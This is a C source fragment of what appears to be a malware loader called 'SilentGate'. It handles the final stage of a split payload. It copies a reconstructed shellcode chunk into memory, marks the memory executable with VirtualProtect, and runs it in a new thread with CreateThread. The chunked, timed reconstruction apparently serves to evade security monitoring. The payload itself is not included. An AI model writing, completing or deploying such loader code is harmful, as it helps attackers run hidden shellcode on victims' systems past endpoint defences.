/*
 * SilentGate Fragment 1/1
 * Offset: 138 bytes  Size: 138 bytes
 * Schedule: t=237ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   1
#define N_FRAGMENTS   2
#define PAYLOAD_SIZE  276
#define CHUNK_OFFSET  138
#define CHUNK_SIZE    138
#define SLEEP_NEXT_MS 237

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 1: Write final chunk + protect + execute */
void sg_execute_fragment_1(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 1] Final fragment at t=237ms\n");

    /* Reconstruct payload for this chunk */
    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);

    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    /* Change to executable */
    DWORD old = 0;
    VirtualProtect(mem, PAYLOAD_SIZE, PAGE_EXECUTE_READ, &old);
    printf("[FRAG 1] Memory protected RX\n");

    /* Execute via CreateThread */
    HANDLE t = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

    if (t) {
        printf("[FRAG 1] Executing reconstructed payload\n");
        WaitForSingleObject(t, 5000);
        CloseHandle(t);
    }

    VirtualFree(mem, 0, MEM_RELEASE);
    printf("[FRAG 1] Complete\n");
}
